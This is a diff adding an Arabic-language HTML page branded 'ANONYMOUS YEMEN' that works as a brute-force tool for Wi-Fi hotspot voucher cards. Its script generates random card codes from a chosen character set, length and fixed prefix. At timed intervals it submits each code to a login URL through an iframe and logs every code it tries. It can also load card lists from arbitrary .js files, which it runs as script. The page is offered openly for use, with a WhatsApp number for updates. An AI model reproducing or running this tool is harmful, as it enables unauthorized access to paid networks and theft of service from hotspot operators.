@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تخمين كروت شبكة الواي فاي | ANONYMOUS YEMEN</title>
+    <style>
+        :root {
+            --primary-color: #28a745;
+            --primary-dark: #218838;
+            --secondary-color: #00FFFF;
+            --background-dark: #000;
+            --card-bg: #111;
+            --input-bg: #222;
+            --text-light: #fff;
+            --border-color: #333;
+            --accent-color: #ff9800;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--background-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            background-image: radial-gradient(circle at 15% 50%, rgba(40, 167, 69, 0.1) 0%, transparent 20%), 
+                              radial-gradient(circle at 85% 30%, rgba(0, 255, 255, 0.1) 0%, transparent 20%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 20px 0;
+            margin-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--secondary-color), transparent);
+        }
+        
+        .ascii-art {
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            color: var(--secondary-color);
+            text-align: center;
+            line-height: 1.2;
+            margin: 20px 0;
+            font-size: 8px;
+            filter: drop-shadow(0 0 5px rgba(0, 255, 255, 0.5));
+        }
+        
+        .brand {
+            font-size: 2.5rem;
+            margin: 10px 0;
+            background: linear-gradient(90deg, var(--secondary-color), var(--primary-color));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+        
+        .toolsbox {
+            background-color: var(--card-bg);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .toolsbox:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.7);
+        }
+        
+        .section-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--secondary-color);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #ddd;
+        }
+        
+        .form-control {
+            width: 100%;
+            height: 40px;
+            padding: 8px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            background-color: var(--input-bg);
+            color: var(--text-light);
+            font-size: 1rem;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(40, 167, 69, 0.25);
+        }
+        
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 25px 0;
+        }
+        
+        .btn {
+            flex: 1;
+            min-width: 150px;
+            height: 45px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn-secondary {
+            background-color: #6c757d;
+            color: white;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #5a6268;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn-warning {
+            background-color: var(--accent-color);
+            color: white;
+        }
+        
+        .btn-warning:hover {
+            background-color: #e68900;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn-danger {
+            background-color: #dc3545;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background-color: #c82333;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        
+        .progress-container {
+            margin: 25px 0;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        progress {
+            width: 100%;
+            height: 20px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        progress::-webkit-progress-bar {
+            background-color: var(--input-bg);
+            border-radius: 10px;
+        }
+        
+        progress::-webkit-progress-value {
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            border-radius: 10px;
+        }
+        
+        .current-card {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: rgba(40, 167, 69, 0.1);
+            border: 1px solid var(--primary-color);
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: var(--secondary-color);
+        }
+        
+        .viewer-container {
+            margin-top: 30px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        #loginPageViewer {
+            width: 100%;
+            height: 500px;
+            border: none;
+            background-color: white;
+        }
+        
+        .completion-section {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            background-color: rgba(0, 255, 255, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+        }
+        
+        #completionImage {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+            margin-top: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+        
+        .welcome-text {
+            margin: 25px 0;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            line-height: 1.8;
+            border-left: 3px solid var(--secondary-color);
+        }
+        
+        .whatsapp-link {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background-color: #25D366;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .whatsapp-link:hover {
+            background-color: #128C7E;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        
+        .download-link {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background-color: var(--accent-color);
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
+            visibility: hidden;
+        }
+        
+        .download-link:hover {
+            background-color: #e68900;
+            transform: translateY(-2px);
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+        
+        .stat-item {
+            text-align: center;
+            flex: 1;
+        }
+        
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--secondary-color);
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+        
+        @media (max-width: 768px) {
+            .btn-group {
+                flex-direction: column;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            .stats {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .brand {
+                font-size: 1.8rem;
+            }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 255, 255, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(0, 255, 255, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 255, 255, 0);
+            }
+        }
+        
+        .glow {
+            text-shadow: 0 0 5px var(--secondary-color), 0 0 10px var(--secondary-color);
+        }
+    </style>
+</head>
+<body onload="showCompletionImage()">
+    <div class="container">
+        <div class="header">
+            <div class="ascii-art">
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣴⣴⣾⣾⣾⣿⣿⣾⣿⣾⣿⣷⣷⣷⣷⣦⣦⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢿⢛⢏⢟⢟⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡟⢝⢟⢿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⣏⣔⣴⣰⢄⢌⠘⠽⣿⣿⣿⣿⡿⠏⢃⢡⣠⣢⣢⣌⣻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣮⡢⣮⣿⣿⣿⣮⢪⣾⣾⣿⣿⣿⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢿⣟⠽⠊⠊⠊⠫⢻⣾⣿⣿⣿⣷⠻⠙⠘⠘⠚⢽⢿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣵⣷⣽⣪⣞⣮⣮⣾⣿⣾⣿⣯⣿⣷⣵⣲⣲⣳⣵⣷⣷⣻⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢗⣿⣿⣿⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣿⣿⣿⣿⣿⣿⢟⣿⣽⣟⣿⣿⣿⢾⣾⢿⡻⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣕⢭⠹⣾⣾⣿⣿⣏⡻⡽⣟⡟⣏⣿⣿⣿⣾⡾⠍⣕⢧⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣝⢦⡈⠟⠟⠟⠏⠁⣠⣦⡀⠈⠛⠟⠟⠟⢁⡾⣣⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣎⢷⣷⣶⣵⣮⣦⣫⣫⣫⣦⣵⣶⣵⣾⢾⣱⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣯⣷⣿⣿⣿⣿⡛⠛⣻⣿⣿⣿⣿⣟⣵⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣷⣿⣿⣿⣿⡏⠀⢻⣿⣿⣿⣿⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡅⠀⣸⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣧⢀⣾⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            </div>
+            <h1 class="brand glow">ANONYMOUS YEMEN</h1>
+            <p class="subtitle">أدوات احترافية لتخمين كروت شبكة الواي فاي</p>
+        </div>
+        
+        <div class="welcome-text">
+            <h2 class="glow">مرحباً بكم في عالم ANONYMOUS YEMEN</h2>
+            <p>حيث الشاشة السوداء وسطر الأوامر هي عالمنا</p>
+            <ul style="margin: 15px 0; padding-right: 20px;">
+                <li>كل ما يخص القرصنة الإلكترونية والأمن السيبراني</li>
+                <li>اختبار الاختراق باستخدام كالي لينكس وأدوات متقدمة</li>
+                <li>تطوير أدوات مخصصة لاختبارات الاختراق الأخلاقي</li>
+            </ul>
+            <p>يمكنكم مراسلتنا على واتساب لاستقبال التحديثات الجديدة:</p>
+            <a href="https://api.whatsapp.com/send?phone=+967773186314" class="whatsapp-link">
+                التواصل عبر واتساب
+            </a>
+        </div>
+        
+        <div class="toolsbox pulse">
+            <h2 class="section-title">إعدادات تخمين الكروت</h2>
+            
+            <div class="form-group">
+                <label for="loginURL">رابط صفحة تسجيل الدخول:</label>
+                <input type="text" id="loginURL" class="form-control" value="http://g.com/login" />
+            </div>
+            
+            <div class="form-group">
+                <label for="loginChars">الرموز المكونة للكرت:</label>
+                <input type="text" id="loginChars" class="form-control" value="0123456789" />
+            </div>
+            
+            <div class="form-group">
+                <label for="loginUsernameLength">عدد الرموز المكونة للكرت:</label>
+                <input type="number" id="loginUsernameLength" class="form-control" value="10" />
+            </div>
+            
+            <div class="form-group">
+                <label for="loginUsernameFixed">جزء بداية الكرت إذا كان ثابت:</label>
+                <input type="text" id="loginUsernameFixed" class="form-control" value="9h" />
+            </div>
+            
+            <div class="form-group">
+                <label for="loginCount">عدد الكروت المطلوب تخمينها ومن ثم توقف:</label>
+                <input type="number" id="loginCount" class="form-control" value="100" />
+            </div>
+            
+            <div class="form-group">
+                <label for="loginTimeOut">الزمن بين المحاولة والمحاولة (بالملي ثانية):</label>
+                <input type="number" id="loginTimeOut" class="form-control" value="1000" />
+            </div>
+            
+            <div class="btn-group">
+                <button class="btn btn-secondary" onclick="usingFile()">
+                    <span>📁</span> إستخدم الكروت من ملف
+                </button>
+                <button class="btn btn-primary" onclick="runProgram()">
+                    <span>▶️</span> إبدأ التخمين
+                </button>
+                <button class="btn btn-danger" onclick="stopProgram()">
+                    <span>⏹️</span> إيقاف التخمين
+                </button>
+                <button class="btn btn-warning" onclick="saveFile()">
+                    <span>💾</span> حفظ الكروت المجربة
+                </button>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-label">
+                    <span>التقدم</span>
+                    <span id="progressPercentage">0%</span>
+                </div>
+                <progress id="prog" max="100" value="0"></progress>
+            </div>
+            
+            <div class="current-card">
+                <span>الكارت الحالي:</span>
+                <span id="currentUsername">لم يبدأ بعد</span>
+            </div>
+            
+            <a id="dlink" class="download-link" download>
+                <span>⬇️</span> حفظ في الملفات
+            </a>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="attemptsCount">0</div>
+                    <div class="stat-label">عدد المحاولات</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="successCount">0</div>
+                    <div class="stat-label">نجاحات</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="remainingCount">100</div>
+                    <div class="stat-label">متبقي</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="viewer-container">
+            <iframe src="" id="loginPageViewer"></iframe>
+        </div>
+        
+        <div class="completion-section">
+            <h3 class="glow">اكتمال العملية</h3>
+            <img id="completionImage" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA...your_base64_encoded_image_data_here..." alt="ANONYMOUS YEMEN">
+        </div>
+    </div>
+
+    <script>
+        var fileData = [];
+        var isUsingFile = false;
+        var dataUsed = [];
+        var ref;
+        var counter = 0;
+        var successCount = 0;
+
+        function sanitizeInput(input) {
+            return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+
+        function getRandom() {
+            let pwdLen = (parseInt(document.getElementById('loginUsernameLength').value) - document.getElementById('loginUsernameFixed').value.length);
+            let chars = sanitizeInput(document.getElementById('loginChars').value);
+            let result = sanitizeInput(document.getElementById('loginUsernameFixed').value);
+            for (let x = 0; x < pwdLen; x++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function usingFile() {
+            let filename = prompt("Input file path (must be a .js file):", "");
+            if (filename.endsWith('.js')) {
+                isUsingFile = true;
+                let sc = document.createElement("script");
+                sc.src = filename;
+                document.body.appendChild(sc);
+                alert("تم تحميل الملف بنجاح!");
+            } else {
+                alert("Invalid file type. Please provide a .js file.");
+            }
+        }
+
+        function saveFile() {
+            let filename = prompt("Input file name to save:", "");
+            if (filename) {
+                let myjson = JSON.stringify(dataUsed);
+                let text = encodeURIComponent("fileData=" + myjson + ";");
+                let dlink = document.getElementById("dlink");
+                dlink.href = "data:text/plain;charset=utf-8," + text;
+                dlink.download = filename;
+                dlink.style.visibility = "visible";
+                alert("تم حفظ الملف بنجاح!");
+            } else {
+                alert("File name cannot be empty.");
+            }
+        }
+
+        function stopProgram() {
+            clearInterval(ref);
+            document.getElementById('completionImage').style.display = 'block';
+            document.querySelector('.toolsbox').classList.remove('pulse');
+        }
+
+        function runProgram() {
+            counter = 0;
+            successCount = 0;
+            document.getElementById('completionImage').style.display = 'none';
+            document.querySelector('.toolsbox').classList.add('pulse');
+            
+            if (isUsingFile) {
+                ref = setInterval(loginFromFile, parseInt(document.getElementById('loginTimeOut').value));
+            } else {
+                ref = setInterval(loginFromScript, parseInt(document.getElementById('loginTimeOut').value));
+            }
+        }
+
+        function loginFromFile() {
+            if (counter < fileData.length) {
+                let cpwd = fileData[counter++];
+                document.getElementById('loginPageViewer').src = document.getElementById('loginURL').value + "?username=" + cpwd;
+                document.getElementById('currentUsername').value = cpwd;
+                updateStats();
+            } else {
+                stopProgram();
+            }
+        }
+
+        function loginFromScript() {
+            if (counter < parseInt(document.getElementById('loginCount').value)) {
+                let cpwd = getRandom();
+                document.getElementById('loginPageViewer').src = document.getElementById('loginURL').value + "?username=" + cpwd;
+                document.getElementById('currentUsername').value = cpwd;
+                dataUsed.push(cpwd);
+                
+                let progress = Math.floor((counter / document.getElementById('loginCount').value) * 100);
+                document.getElementById('prog').value = progress;
+                document.getElementById('progressPercentage').textContent = progress + "%";
+                
+                updateStats();
+                counter++;
+            } else {
+                stopProgram();
+            }
+        }
+
+        function updateStats() {
+            document.getElementById('attemptsCount').textContent = counter;
+            document.getElementById('successCount').textContent = successCount;
+            
+            let remaining = parseInt(document.getElementById('loginCount').value) - counter;
+            document.getElementById('remainingCount').textContent = remaining > 0 ? remaining : 0;
+        }
+
+        function showCompletionImage() {
+            document.getElementById('completionImage').style.display = 'block';
+        }
+        
+        // تحديث الإحصائيات عند التحميل
+        document.addEventListener('DOMContentLoaded', function() {
+            updateStats();
+        });
+    </script>
+</body>
+</html>
